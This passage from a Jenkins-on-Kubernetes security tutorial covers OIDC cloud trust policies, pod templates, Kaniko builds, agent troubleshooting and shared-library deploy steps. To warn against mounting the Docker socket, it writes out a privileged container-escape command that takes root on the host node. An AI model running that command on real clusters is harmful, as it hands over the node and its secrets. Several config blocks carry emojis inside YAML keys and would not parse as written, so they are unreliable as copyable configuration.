            export AWS_ROLE_SESSION_NAME="jenkins-${BUILD_TAG}"
            # ⭐ aws-cli v2 reads AWS_WEB_IDENTITY_TOKEN_FILE automatically
            aws sts get-caller-identity
            aws eks update-kubeconfig --name shop-prod --region ap-south-1
            kubectl -n shop get deploy
            shred -u .oidc-token            # ⭐⭐ DESTROY the token file
          '''
        }
      }
    }
  }
}
```

```bash
# ── the AWS side ⭐⭐ the trust policy is where the security lives ──
cat > trust-jenkins.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/jenkins.shop.example.com/oidc"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "jenkins.shop.example.com/oidc:aud": "sts.amazonaws.com",
        "jenkins.shop.example.com/oidc:iss": "https://jenkins.shop.example.com/oidc",
        "jenkins.shop.example.com/oidc:jenkins_scm_ref": "refs/heads/main"
      },
      "StringLike": {
        "jenkins.shop.example.com/oidc:sub": "shop/production/*"
      }
    }
  }]
}
EOF
# ⭐⭐ TWO conditions do the work:
#   jenkins_scm_ref == refs/heads/main   → a PR build or a feature branch is DENIED
#   sub LIKE shop/production/*           → only jobs in the production folder
# That's the equivalent of GitHub's `repo:OWNER/REPO:environment:production`.

aws iam create-open-id-connect-provider \
  --url https://jenkins.shop.example.com/oidc \
  --client-id-list sts.amazonaws.com jenkins-shop \
  --thumbprint-list "$(openssl s_client -servername jenkins.shop.example.com \
     -connect jenkins.shop.example.com:443 </dev/null 2>/dev/null \
     | openssl x509 -fingerprint -sha1 -noout | cut -d= -f2 | tr -d ':')"

aws iam create-role --name jenkins-prod-deployer \
  --assume-role-policy-document file://trust-jenkins.json \
  --max-session-duration 3600
aws iam put-role-policy --role-name jenkins-prod-deployer \
  --policy-name least-privilege --policy-document file://perm-prod.json   # from Case 2

# ── the Azure side ────────────────────────────────────────────────
az ad app create --display-name jenkins-shop --query appId -o tsv
az ad app federated-credential create --id "$APP_ID" --parameters '{
  "name": "jenkins-production",
  "issuer": "https://jenkins.shop.example.com/oidc",
  "subject": "shop/production/shop-production-deploy",
  "audiences": ["api://AzureADTokenExchange"]
}'
# then use the azure-credentials plugin's "OpenID Connect" type, or:
az login --service-principal --federated-token "$(cat .oidc-token)" --tenant "$TENANT"

# ── the Vault side ⭐ (the cleanest integration) ──────────────────
vault write auth/jwt/config \
  oidc_discovery_url="https://jenkins.shop.example.com/oidc" \
  bound_issuer="https://jenkins.shop.example.com/oidc"
vault write auth/jwt/role/jenkins-shop-production \
  role_type="jwt" \
  bound_audiences="vault.shop.example.com" \
  bound_claims='{"jenkins_job_name":"shop/production/shop-production-deploy","jenkins_scm_ref":"refs/heads/main"}' \
  claim_mappings='{"jenkins_job_name":"job","jenkins_build_number":"build"}' \
  user_claim="sub" policies="shop-production-deploy" ttl=1h
```

**The honest assessment:**

```
⭐ Jenkins' OIDC story works, but it is DIY compared to GitHub Actions.
   - The oidc-provider plugin gives you a real issuer, real JWKS and real claims.
   - ⛔ But YOU must fetch the token with curl, YOU must decide the audience,
     and YOU must destroy the token file.
   - ⛔ There is no `uses: aws-actions/configure-aws-credentials@v5` equivalent
     maintained by AWS for Jenkins. There IS `jenkins-x/io-jenkins-plugins-oidc-provider`
     and community plugins, but the ecosystem is thin.
   - ⭐ The claims are RICH (job name, SCM ref, SCM commit, build number) which
     makes for very precise trust policies — arguably better than GitHub's `sub`.
   - ⭐⭐ The pragmatic Jenkins answer in most shops is Vault: Jenkins authenticates
     to Vault with an AppRole or Kubernetes auth, Vault issues a short-lived
     cloud credential via its AWS/Azure/GCP secrets engines. That gives you
     rotation, auditing and least privilege with mature tooling.
```

---

## 3 · Agents — the Kubernetes plugin ⭐⭐

This is the single most important Jenkins-on-Kubernetes topic. Get it right and Jenkins scales to zero, costs nothing when idle, and has no persistent attack surface. Get it wrong and you have a privileged Docker daemon and a persistent agent anyone can poison.

### 3.1 The concepts

```
CLOUD        a source of agents                ("kubernetes", "ec2-fleet", "docker")
NODE         one agent (a machine, a VM, a POD)
LABEL        a string agents advertise         ("linux", "docker", "maven", "gpu")
EXECUTOR     a slot on a node — how many jobs it runs CONCURRENTLY
             ⭐⭐ on a Kubernetes pod agent this should be ONE. The pod dies after.
AGENT POD    the pod the Kubernetes plugin creates, per job, on demand
INBOUND      the agent connects TO the controller (port 50000) — no inbound firewall hole
JNLP         the older name for the same thing
```

### 3.2 Pod templates — three ways to define them

**Way 1: the UI (learn here, never keep it here)**

```
Manage Jenkins → Clouds → kubernetes (configure) → Pod Templates → Add Pod Template

  Name:            shop-base
  Namespace:       jenkins
  ⭐ Labels:       shop linux docker java21
  Usage:           ⭐ "Only build jobs with label expressions matching this node"
                   (NOT "Use this node as much as possible" — that puts random
                    builds on expensive agents)
  ⭐ Executors:    1
  Containers:
    · Name: jnlp        ⭐⭐ MUST be named `jnlp`
      Image: jenkins/inbound-agent:3313.vf6a_8b_1f0c4d1-1-jdk21
      Working dir: /home/jenkins/agent
      Command:  (empty)   ⭐⭐ LEAVE IT EMPTY — the plugin injects the agent launch
      Args:     (empty)
      ⭐ Privileged: FALSE
      Always pull image: TRUE          ⭐⭐ never run a stale cached image
      Resource request: 250m CPU / 512Mi
      Resource limit:   1 CPU / 2Gi
    · Name: java
      Image: eclipse-temurin:21-jdk-jammy
      Command: sleep   Args: infinity   ⭐⭐ REQUIRED or the container exits immediately
  Volumes:
    · EmptyDir → /home/jenkins/agent/workspace   memory:false  sizeLimit:10Gi
    · Host Path: ⛔ NEVER for /var/run/docker.sock
  ⭐ Idle minutes: 0        (the pod is destroyed as soon as the build finishes)
  ⭐ Pod retention: Never   (NEVER keep a pod after a failure — debug with logs instead)
  Service Account: jenkins-agent
  ⭐ Automount service account token: FALSE
  Node selector: kubernetes.io/os=linux
  YAML: (the whole pod spec — this is what we'll use in code)
```

**Way 2: JCasC ⭐ (production)**

```yaml
# ⭐ the `jenkins:` block of the JCasC config — see §10 for the whole file
jenkins:
  clouds:
    - kubernetes:
        name: kubernetes
        serverUrl: https://kubernetes.default
        namespace: jenkins
        # ⭐⭐ the credential for the Kubernetes API — a ServiceAccount token or kubeconfig
        credentialsId: kubernetes-cloud-sa
        jenkinsUrl: http://jenkins.jenkins.svc.cluster.local:8080
        jenkinsTunnel: jenkins-agent.jenkins.svc.cluster.local:50000
        containerCapStr: '50'                # ⭐⭐ MAX CONCURRENT AGENT PODS
        maxRequestsPerHostStr: '32'
        retentionTimeout: 300
        waitForPodSec: 600
        connectTimeout: 10
        readTimeout: 20
        ⭐ restrictKubernetesCloudsToFolder: true   # ⭐⭐ a folder may only use its own clouds
        garbageCollection:
          timeout: 300                       # ⭐ reap orphaned agent pods
        templates:
          # ── the base template ─────────────────────────────────
          - name: shop-base
            namespace: jenkins
            label: 'shop linux'
            nodeUsageMode: EXCLUSIVE         # ⭐⭐ only jobs that ASK for this label
            nodeSelector: 'kubernetes.io/os=linux'
            serviceAccount: jenkins-agent
            instanceCap: 20                  # ⭐ max instances of THIS template
            idleMinutes: 0                   # ⭐⭐ destroy immediately when idle
            podRetention: never              # ⭐⭐ never | onFailure | always
            activeDeadlineSeconds: 900
            inheritFrom: ''
            containers:
              - name: jnlp
                image: 'jenkins/inbound-agent:3313.vf6a_8b_1f0c4d1-1-jdk21'
                alwaysPullImage: true        # ⭐⭐ SECURITY: never a stale image
                workingDir: /home/jenkins/agent
                privileged: false            # ⭐⭐ NEVER true
                runAsUser: 1000
                runAsGroup: 1000
                ttyEnabled: true
                resourceRequestCpu: '250m'
                resourceRequestMemory: '512Mi'
                resourceLimitCpu: '1'
                resourceLimitMemory: '2Gi'
                envVars:
                  - envVar:
                      key: JAVA_TOOL_OPTIONS
                      value: '-XX:MaxRAMPercentage=75'
              - name: java
                image: 'eclipse-temurin:21-jdk-jammy'
                command: 'sleep'
                args: 'infinity'
                alwaysPullImage: true
                privileged: false
                ttyEnabled: false
                resourceRequestCpu: '500m'
                resourceRequestMemory: '1Gi'
                resourceLimitCpu: '2'
                resourceLimitMemory: '4Gi'
            volumes:
              - emptyDirVolume:
                  mountPath: /home/jenkins/agent/workspace
                  memory: false
                  sizeLimit: 10Gi            # ⭐⭐ BOUNDED — a runaway build can't fill the node
              - emptyDirVolume:
                  mountPath: /home/jenkins/.m2
                  memory: false
                  sizeLimit: 5Gi
            workspaceVolume:
              emptyDirWorkspaceVolume:
                memory: false
            yamlMergeStrategy: override       # ⭐ how an inline `yaml` merges with this
            annotations:
              - podAnnotation:
                  key: 'shop.example.com/purpose'
                  value: 'ci-agent'
          # ── a specialised template ────────────────────────────
          - name: shop-kaniko
            namespace: jenkins
            label: 'shop kaniko image-build'
            nodeUsageMode: EXCLUSIVE
            inheritFrom: 'shop-base'          # ⭐⭐ INHERITANCE — don't repeat yourself
            containers:
              - name: kaniko
                image: 'gcr.io/kaniko-project/executor:v1.23.2-debug'
                command: 'sleep'
                args: 'infinity'
                alwaysPullImage: true
                privileged: false             # ⭐⭐ kaniko needs NO privileges
                resourceRequestCpu: '1'
                resourceRequestMemory: '2Gi'
                resourceLimitCpu: '2'
                resourceLimitMemory: '4Gi'
                envVars:
                  - envVar: {key: DOCKER_CONFIG, value: /home/jenkins/.docker}
            volumes:
              - emptyDirVolume:
                  mountPath: /home/jenkins/.docker
                  memory: false
                  sizeLimit: 1Gi
          # ── a GPU/expensive template ──────────────────────────
          - name: shop-gpu
            namespace: jenkins
            label: 'shop gpu e2e'
            nodeUsageMode: EXCLUSIVE
            inheritFrom: 'shop-base'
            instanceCap: 2                    # ⭐ only two at a time — they're expensive
            nodeSelector: 'nvidia.com/gpu=present'
            containers:
              - name: playwright
                image: 'mcr.microsoft.com/playwright:v1.49.0-jammy'
                command: 'sleep'
                args: 'infinity'
                privileged: false
                resourceLimitCpu: '4'
                resourceLimitMemory: '8Gi'
```

**Way 3: inline in the Jenkinsfile ⭐ (per-job overrides)**

```groovy
// ⭐ the `inheritFrom` mechanism is what makes this safe and DRY
agent {
  kubernetes {
    inheritFrom 'shop-base'              // ⭐⭐ gets the jnlp container, the volumes,
                                         //    the security context, everything
    label "shop-${env.BUILD_NUMBER}"     // ⭐ unique, so builds don't collide
    instanceCap 5
    defaultContainer 'java'
    yaml '''
spec:
  containers:
    - name: postgres                     # ⭐ a service container, like GitHub's `services:`
      image: postgres:17-alpine
      env:
        - {name: POSTGRES_PASSWORD, value: shop}
        - {name: POSTGRES_DB, value: shop}
      readinessProbe:
        exec: {command: [pg_isready, -U, postgres]}
        initialDelaySeconds: 5
        periodSeconds: 5
    - name: redis
      image: redis:7-alpine
      command: [redis-server]
'''
  }
}

// ⭐ and the shorthand forms:
agent { kubernetes 'shop-kaniko' }                    // use a named template as-is
agent { label 'shop linux' }                          // any agent with BOTH labels
agent { label 'shop && (java21 || go)' }              // ⭐ a label EXPRESSION
agent { node { label 'shop'; customWorkspace '/tmp/x' } }
agent any                                             // ⛔ the built-in node — DON'T
agent none                                            // ⭐ per-stage agents instead
```

### 3.3 `container()` — the thing that confuses everyone

```groovy
// ⭐ the pod has FOUR containers. A step runs in ONE of them.
agent { kubernetes { inheritFrom 'shop-base'; defaultContainer 'java' } }

stages {
  stage('X') {
    steps {
      sh 'java -version'                  // ✅ runs in `java` (the defaultContainer)

      container('tools') {                // ⭐ switch containers for a block
        sh 'helm version'                 // ✅ runs in `tools`
      }

      container('kaniko') {
        sh '/kaniko/executor --help'      // ✅ runs in `kaniko`
      }

      container('jnlp') {                 // ⭐ the agent container itself
        sh 'ls /home/jenkins/agent'       //    has the workspace mounted
      }

      // ⭐⭐ ALL containers in the pod SHARE the volumes.
      //    So a file written in `java` is visible in `kaniko`.
      //    That's how the workspace is shared. It's also why you must be
      //    deliberate about what's in the shared volume.
    }
  }
}

// ⛔ THE THREE CONTAINER MISTAKES
// 1. the container exits immediately because it has no long-running command
//    FIX: command: 'sleep', args: 'infinity'   (or `cat` / `tail -f /dev/null`)
// 2. `container('docker')` fails with "no such container"
//    FIX: the name in `container()` must EXACTLY match the pod spec's container name
// 3. ⛔ the workspace is empty in the second container
//    FIX: the workspace volume must be mounted at the SAME path in every container.
//         `workspaceVolume` handles this; a manual `emptyDirVolume` must be explicit.
```

### 3.4 Kaniko vs Docker-in-Docker vs the socket ⭐⭐

```
┌───────────────────────────────────────────────────────────────────────────┐
│ ⛔ OPTION 1: mount /var/run/docker.sock into the agent pod               │
│                                                                           │
│    volumes:                                                               │
│      - hostPath: {path: /var/run/docker.sock}                             │
│                                                                           │
│    WHAT YOU'VE ACTUALLY DONE: given every build ROOT ON EVERY NODE.       │
│    A build can:                                                           │
│      docker run --privileged -v /:/host alpine chroot /host sh            │
│    …and it now owns the Kubernetes node, its kubelet credentials, every   │
│    other pod's secrets, and (with the node's SA) potentially the cluster. │
│    ⛔⛔⛔ NEVER DO THIS. Not "be careful" — NEVER.                        │
└───────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────┐
│ ⚠️ OPTION 2: privileged DinD (a `dind` sidecar with privileged: true)     │
│                                                                           │
│    Slightly better than the socket — the build gets a daemon inside its   │
│    own pod, not on the node. But `privileged: true` still allows:         │
│      · escaping to the node via /proc, /sys, cgroups                       │
│      · loading kernel modules                                             │
│      · reading other containers' filesystems on the same node             │
│    ⛔ Still unacceptable in a multi-tenant Jenkins.                        │
└───────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────┐
│ ⭐⭐ OPTION 3: KANIKO — no daemon, no privileges, runs as an unprivileged │
│    user in an ordinary container.                                         │
│                                                                           │
│    /kaniko/executor --context dir:///workspace/apps/shop-api \            │
│      --dockerfile /workspace/apps/shop-api/Dockerfile \                   │
│      --destination ghcr.io/3558bhk/shop-api:$SHA \                        │
│      --cache=true --cache-repo=ghcr.io/3558bhk/shop-api-cache             │
│                                                                           │
│    ✅ no daemon, no privileges, no socket                                  │
│    ✅ registry-based layer caching (--cache-repo) that WORKS across pods   │
│    ✅ --reproducible for byte-identical rebuilds                           │
│    ✅ --sbom= cyclonedx | spdx — an SBOM as part of the build              │
│    ⛔ slower than BuildKit for some Dockerfiles (no parallel stage builds) │
│    ⛔ doesn't support every BuildKit feature (no `RUN --mount=type=cache`) │
│    ⛔ `--context dir://` not `git://` for a local checkout                 │
└───────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────┐
│ ⭐ OPTION 4: buildx with a remote/`docker-container` driver on a           │
│    dedicated builder pod. Works, but you're running a privileged builder. │
│ ⭐ OPTION 5: don't build in Jenkins at all — push the source and let       │
│    ACR Tasks / GitHub Actions / BuildKit-on-a-builder do it.              │
└───────────────────────────────────────────────────────────────────────────┘
```

```groovy
// ⭐ the Kaniko pattern, complete and correct
stage('Build image') {
  agent { kubernetes { inheritFrom 'shop-kaniko' } }
  steps {
    container('kaniko') {
      // ⭐⭐ 1. the registry credentials, as a Docker config.json
      script {
        withCredentials([usernamePassword(credentialsId: 'ghcr-token',
                                          usernameVariable: 'U', passwordVariable: 'P')]) {
          // ⭐ the `-debug` variant of the kaniko image ships a shell + `jq`
          sh '''
            set -euo pipefail
            mkdir -p /kaniko/.docker
            AUTH=$(printf '%s:%s' "$U" "$P" | base64 -w0)
            jq -n --arg a "$AUTH" \
              '{"auths":{"ghcr.io":{"auth":$a,"username":"'"$U"'","password":"'"$P"'"}}}' \
              > /kaniko/.docker/config.json
            chmod 600 /kaniko/.docker/config.json
          '''
        }
      }
      // ⭐⭐ 2. the build
      script {
        def services = ['shop-api', 'checkout', 'order-worker', 'shop-ui']
        def branches = [:]
        services.each { svc ->
          branches["build-${svc}"] = {
            // ⭐⭐ each parallel branch needs its OWN pod, or they contend on /kaniko
            node('shop-kaniko') {
              container('kaniko') {
                sh """
                  set -euo pipefail
                  /kaniko/executor \\
                    --context "dir://${env.WORKSPACE}/apps/${svc}" \\
                    --dockerfile "${env.WORKSPACE}/apps/${svc}/Dockerfile" \\
                    --destination "${env.REGISTRY}/${svc}:${env.GIT_COMMIT}" \\
                    --cache=true \\
                    --cache-repo="${env.REGISTRY}/${svc}-cache" \\
                    --cache-copy-layers=true \\
                    --cache-ttl=168h \\
                    --compressed-caching=false \\
                    --snapshot-mode=redo \\
                    --use-new-run \\
                    --reproducible \\
                    --label org.opencontainers.image.revision=${env.GIT_COMMIT} \\
                    --build-arg VERSION=${env.GIT_COMMIT} \\
                    --verbosity=info \\
                    2>&1 | tee kaniko-${svc}.log
                """
                // ⭐ capture the digest from the log
                def digest = sh(returnStdout: true,
                  script: "grep -oE 'sha256:[a-f0-9]{64}' kaniko-${svc}.log | tail -1").trim()
                echo "  ${svc} → ${digest}"
                writeFile file: "digests/${svc}.txt", text: digest
              }
            }
          }
        }
        parallel branches
        stash name: 'digests', includes: 'digests/*.txt'
      }
    }
  }
}
```

### 3.5 Agent troubleshooting

```bash
# ⭐ the pod is created but the build never starts
kubectl -n jenkins get pods -l jenkins/label -o wide
kubectl -n jenkins describe pod <agent-pod>
# the usual culprits:
#   ImagePullBackOff      → the image tag is wrong, or no pull secret
#   Pending / 0/1 nodes   → insufficient CPU/memory; `instanceCap` reached
#   CrashLoopBackOff jnlp → the `command:`/`args:` were set on jnlp (LEAVE THEM EMPTY)
#   CreateContainerConfigError → a referenced Secret/ConfigMap doesn't exist
kubectl -n jenkins logs <agent-pod> -c jnlp --tail=100
kubectl -n jenkins logs <agent-pod> -c jnlp --previous    # ⭐ the crashed instance

# ⭐ the controller's view
kubectl -n jenkins logs sts/jenkins -c jenkins | grep -iE 'kubernetes|pod|agent' | tail -50
# Manage Jenkins → System Log → add a logger:
#   io.jenkins.plugins.kubernetes            FINE     ⭐⭐ THE DEBUGGING LOGGER
#   org.jenkinsci.plugins.durabletask        FINE
#   hudson.slaves                            FINE
#   org.jenkinsci.plugins.workflow           FINE

# ⛔ "There are no nodes with the label 'shop linux'"
#    → the template's `label` doesn't match, OR nodeUsageMode is EXCLUSIVE and
#      your job's label expression doesn't match exactly
#    → Manage Jenkins → Nodes — is the template even listed?

# ⛔ "Agent went offline" / "Ping response time out"
#    → the jenkinsTunnel URL is wrong (a common Helm-values mistake)
#    → a network policy blocks port 50000
kubectl -n jenkins get svc jenkins-agent -o yaml | grep -A3 ports
kubectl -n jenkins exec <pod> -- nc -vz jenkins-agent.jenkins.svc.cluster.local 50000

# ⛔ the workspace is empty in a container
#    → the workspaceVolume isn't mounted there. Check `mountPath`.

# ⛔ builds queue forever at low volume, then work
#    → `maxRequestsPerHostStr` is too low, or the controller's HTTP client is
#      rate-limited by the API server. Raise it, and check kube-apiserver logs.

# ⭐ how many agents are running right now, and what are they doing?
kubectl -n jenkins get pods -l jenkins/label --no-headers | wc -l
kubectl -n jenkins top pods -l jenkins/label
```

```groovy
// ⭐ the Script Console diagnostic
import jenkins.model.Jenkins
import hudson.model.*
import hudson.slaves.*

println "=== nodes ==="
Jenkins.instance.nodes.each { n ->
  println "  ${n.nodeName.padRight(40)} online=${n.computer?.online} idle=${n.computer?.idle} " +
          "executors=${n.numExecutors} labels=${n.labelString}"
}
println "  ${'built-in'.padRight(40)} online=${Jenkins.instance.computer.online} " +
        "⛔ executors=${Jenkins.instance.numExecutors}  ← MUST BE 0"

println "\n=== queue ==="
Jenkins.instance.queue.items.each {
  println "  ${it.task.name}  waiting ${System.currentTimeMillis() - it.inQueueSince}ms  why=${it.why}"
}

println "\n=== running builds ==="
Jenkins.instance.computers.each { c ->
  c.executors.findAll { it.progress >= 0 }.each { e ->
    println "  ${c.name}  ${e.currentExecutable?.fullDisplayName}  ${e.progress}%"
  }
}

println "\n=== clouds ==="
Jenkins.instance.clouds.each { cloud ->
  println "  ${cloud.displayName}  (${cloud.getClass().simpleName})"
  if (cloud instanceof org.csanchez.jenkins.plugins.kubernetes.KubernetesCloud) {
    println "    containerCap=${cloud.containerCap}  namespace=${cloud.namespace}"
    cloud.templates.each { t ->
      println "    template ${t.name.padRight(20)} label='${t.label}' " +
              "instanceCap=${t.instanceCap} containers=${t.containers*.name}"
    }
  }
}
```

### 3.6 ⭐ The built-in node must have ZERO executors

```
Manage Jenkins → Nodes → Built-In Node → Configure
  ⭐ "# of executors":  0
  ⭐ Usage: "Leave this node for tied jobs only"
  Remote FS root: /var/jenkins_home
  Labels: built-in master            ⭐ so nothing accidentally matches it

WHY: a build running on the controller can read JENKINS_HOME — every credential,
every job config, the Script Console's history, the whole configuration.
A build running in an ephemeral pod can read only its own workspace.
⛔ Setting executors to 0 is the single highest-value Jenkins security control.
```

```groovy
// ⭐ enforce it from JCasC so nobody can turn it back on
jenkins:
  numExecutors: 0
  mode: EXCLUSIVE
  labelString: 'built-in'
  // and:
  securityRealm: …
  authorizationStrategy:
    globalMatrix:
      permissions:
        - "Overall/Administer:admin"
        - "Overall/Read:authenticated"
        // ⛔ "Overall/Administer:developers"  ← never
```

```groovy
// ⭐ and a policy check that fails the build if it somehow lands on the controller
stage('Assert we are not on the controller') {
  steps {
    script {
      if (env.NODE_NAME?.contains('built-in') || env.NODE_NAME?.contains('master')) {
        error("⛔ this build is running on the Jenkins CONTROLLER (${env.NODE_NAME}). " +
              "That is a configuration error and a security problem. Aborting.")
      }
      echo "  ✅ running on ${env.NODE_NAME}"
    }
  }
}
```

---

## 4 · The shared library ⭐⭐ (Jenkins' reuse layer)

```
A shared library is a Git repository with this structure:

pipeline-library/
├── src/                    ⭐ Groovy CLASSES — full object-oriented code
│   └── com/shop/ci/
│       ├── ImageBuilder.groovy
│       ├── Deployer.groovy
│       └── Notifier.groovy
├── vars/                   ⭐⭐ GLOBAL VARIABLES — these become pipeline STEPS
│   ├── buildAndPushImage.groovy
│   ├── deployTo.groovy
│   ├── notifySlack.groovy
│   ├── standardPipeline.groovy       ← the whole pipeline in one call
│   └── productionGate.groovy
├── resources/              ⭐ non-Groovy files, read with libraryResource()
│   ├── pod-templates/java.yaml
│   ├── pod-templates/kaniko.yaml
│   ├── prometheus-rules.yaml
│   └── slack-templates/deploy.json
├── test/                   ⭐⭐ JenkinsPipelineUnit tests — YES, you can test a pipeline
│   └── groovy/com/shop/ci/DeployerTest.groovy
├── docs/API.md
└── Jenkinsfile             ⭐ the library's OWN CI
```

### 4.1 Configuring the library

```
Manage Jenkins → System → Global Pipeline Libraries → Add

  Name:                shop-shared
  ⭐ Default version:  v2                       ⭐⭐ A TAG. Never `master`/`main`.
  Retrieval method:    Modern SCM
     → GitHub:  3558Bhk/pipeline-library
     → Credentials: github-bot (a PAT or a GitHub App)
  ☑ Load implicitly       ⭐ makes it available to EVERY pipeline without @Library
     ⛔ DON'T — it means a library bug breaks every pipeline at once.
     ✅ Leave OFF and use @Library('shop-shared@v2') _ explicitly.
  ☐ Allow default version to be overridden
     ⭐ ON, so a Jenkinsfile may pin a different version — but see the note below.
  ☑ Include @Library changes in job recent changes
```

```groovy
// ⭐⭐ THE PINNING DISCIPLINE
@Library('shop-shared') _                    // ⛔ the default version — mutable
@Library('shop-shared@v2') _                 // ⚠️ a movable major tag
@Library('shop-shared@v2.4.1') _             // ⭐ an immutable tag
@Library('shop-shared@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2') _   // ⭐⭐ A SHA — best

// ⭐ and the folder-scoped library (Manage Jenkins → the FOLDER → Pipeline Libraries)
//   → so the `platform/` folder and the `shop/` folder may use DIFFERENT versions
```

### 4.2 `vars/` — global steps

```groovy
// vars/notifySlack.groovy
// ⭐ becomes `notifySlack(...)` in any pipeline that loads the library
import groovy.json.JsonOutput

def call(Map config = [:]) {
  // ⭐ typed, defaulted, validated — a real API
  def text     = config.text ?: "⚠️ ${env.JOB_NAME} #${env.BUILD_NUMBER}: ${currentBuild.currentResult}"
  def color    = config.color ?: colorFor(currentBuild.currentResult)
  def channel  = config.channel ?: null            // null = the webhook's default
  def webhookId = config.credentialsId ?: 'slack-webhook'
  def extraFields = config.fields ?: []
  def failOnError = config.failOnError ?: false     // ⭐⭐ notifications never fail a build

  def fields = [
    [title: 'Job',      value: env.JOB_NAME,                 short: true],
    [title: 'Build',    value: "#${env.BUILD_NUMBER}",       short: true],
    [title: 'Branch',   value: env.GIT_BRANCH ?: env.CHANGE_BRANCH ?: '?', short: true],
    [title: 'Revision', value: (env.GIT_COMMIT ?: '?').take(7), short: true],
    [title: 'Duration', value: currentBuild.durationString?.replace(' and counting','') ?: '?', short: true],
    [title: 'Trigger',  value: triggerReason(),              short: true],
  ] + extraFields

  def payload = JsonOutput.toJson([
    channel: channel,
    attachments: [[
      color: color,
      title: text,
      title_link: env.BUILD_URL,
      fallback: text,
      fields: fields,
      footer: "Jenkins · ${env.JOB_NAME}",
      ts: (System.currentTimeMillis() / 1000).toInteger()
    ]]
  ])

  try {
    withCredentials([string(credentialsId: webhookId, variable: 'SLACK_URL')]) {
      // ⭐ write the payload to a FILE so nothing untrusted lands in the shell text
      writeFile file: '.slack-payload.json', text: payload
      sh '''
        set -euo pipefail
        curl -sf --retry 3 --retry-delay 5 --max-time 20 \
          -XPOST -H 'Content-Type: application/json' \
          --data-binary @.slack-payload.json "$SLACK_URL"
      '''
      sh 'rm -f .slack-payload.json'
    }
  } catch (Exception e) {
    def msg = "⚠️ the Slack notification failed: ${e.message}"
    echo msg
    if (failOnError) { error(msg) }
  }
}

// ── helper: a colour per result ─────────────────────────────────
private String colorFor(String result) {
  switch (result) {
    case 'SUCCESS':   return 'good'
    case 'UNSTABLE':  return 'warning'
    case 'FAILURE':   return 'danger'
    case 'ABORTED':   return '#808080'
    default:          return '#439FE0'
  }
}

// ── helper: why did this build run? ─────────────────────────────
@NonCPS                                       // ⭐⭐ getBuildCauses is NOT serializable
private String triggerReason() {
  try {
    def causes = currentBuild.getBuildCauses()
    return causes.collect { it.shortDescription ?: it._class.tokenize('.').last() }.join(', ')
  } catch (e) { return 'unknown' }
}
```

```groovy
// vars/deployTo.groovy ⭐⭐ THE STEP EVERY PIPELINE CALLS
import groovy.json.JsonOutput
import groovy.json.JsonSlurper

def call(String environment) {
  call([environment: environment])
}

def call(Map config) {
  def env_        = config.environment ?: error('`environment` is required')
  def revision    = config.revision ?: env.GIT_COMMIT ?: error('no revision')
  def chartPath   = config.chartPath ?: 'helm/shop'
  def release     = config.release ?: 'shop'
  def namespace   = config.namespace ?: 'shop'
  def dryRun      = config.dryRun ?: false
  def atomic      = config.atomic != null ? config.atomic : true
  def timeout     = config.timeout ?: '10m'
  def smokeTest   = config.smokeTest != null ? config.smokeTest : true
  def rollbackOnFailure = config.rollbackOnFailure != null ? config.rollbackOnFailure : true
  def kubeCredsId = config.kubeCredentialsId ?: "kubeconfig-${env_}"

  // ⭐⭐ GUARD: only the allowed environments may be deployed from here
  def allowed = ['dev', 'staging', 'production']
  if (!(env_ in allowed)) { error("unknown environment '${env_}' — allowed: ${allowed}") }

  // ⭐⭐ GUARD: production may only be deployed from main
  if (env_ == 'production') {
    def ref = env.GIT_BRANCH ?: env.CHANGE_BRANCH ?: ''
    if (!(ref in ['main', 'origin/main', 'refs/heads/main'])) {
      error("⛔ refusing to deploy to production from '${ref}'")
    }
    if (env.CHANGE_ID) {
      error("⛔ refusing to deploy to production from a pull request (#${env.CHANGE_ID})")
    }
  }

  stage("🚀 Deploy to ${env_}") {
    // ⭐ 1. unstash the digests built by CI — BUILD ONCE, PROMOTE MANY
    unstash 'digests'

    // ⭐ 2. the observability gate for production
    if (env_ == 'production') {
      productionGate(environment: env_)          // ← another vars/ step
    }

    // ⭐ 3. the deploy
    withCredentials([file(credentialsId: kubeCredsId, variable: 'KUBECONFIG')]) {
      // ⭐ the deploy logic is in a SHELL SCRIPT in the repo — not in Groovy.
      //    That makes it testable, lintable (shellcheck) and portable across CI tools.
      def envMap = [
        ENV: env_, REVISION: revision, CHART: chartPath, RELEASE: release,
        NAMESPACE: namespace, DRY_RUN: dryRun.toString(), ATOMIC: atomic.toString(),
        TIMEOUT: timeout, DIGEST_DIR: "${pwd()}/digests",
        DEPLOYED_BY: "jenkins/${env.JOB_NAME}/${env.BUILD_NUMBER}",
        BUILD_URL: env.BUILD_URL,
        SMOKE_TEST: smokeTest.toString(),
        ROLLBACK_ON_FAILURE: rollbackOnFailure.toString(),
      ]
      withEnv(envMap.collect { k, v -> "${k}=${v}" }) {
        try {
          sh '''
            set -euo pipefail
            echo "==> deploying $ENV at ${REVISION:0:7}"
            chmod +x ./scripts/deploy.sh
            ./scripts/deploy.sh "$ENV" "$REVISION"
          '''
          env["${env_.toUpperCase()}_DEPLOYED"] = 'true'   // ⭐ for a later `when`
        } catch (Exception e) {
          echo "⛔ the deploy to ${env_} failed: ${e.message}"
          // ⭐ capture the evidence BEFORE any rollback
          sh '''
            set -uo pipefail
            kubectl -n "$NAMESPACE" get pods -o wide || true
            kubectl -n "$NAMESPACE" get events --sort-by=.lastTimestamp | tail -40 || true
            helm history "$RELEASE" -n "$NAMESPACE" | tail -5 || true
            for d in $(kubectl -n "$NAMESPACE" get deploy -o name 2>/dev/null); do
              kubectl -n "$NAMESPACE" logs "$d" --tail=80 --all-containers 2>/dev/null || true
            done
          '''
          archiveArtifacts artifacts: 'deploy-evidence/**', allowEmptyArchive: true
          notifySlack(text: "⛔ the deploy to ${env_} FAILED — ${env.BUILD_URL}console",
                      color: 'danger')
          throw e
        }
      }
    }

    // ⭐ 4. record it — the audit trail
    script {
      def record = JsonOutput.prettyPrint(JsonOutput.toJson([
        environment: env_, revision: revision, buildNumber: env.BUILD_NUMBER.toInteger(),
        buildUrl: env.BUILD_URL, deployedBy: currentBuild.getBuildCauses('UserIdCause') ?
          currentBuild.getBuildCauses('UserIdCause')[0].userId : 'scm',
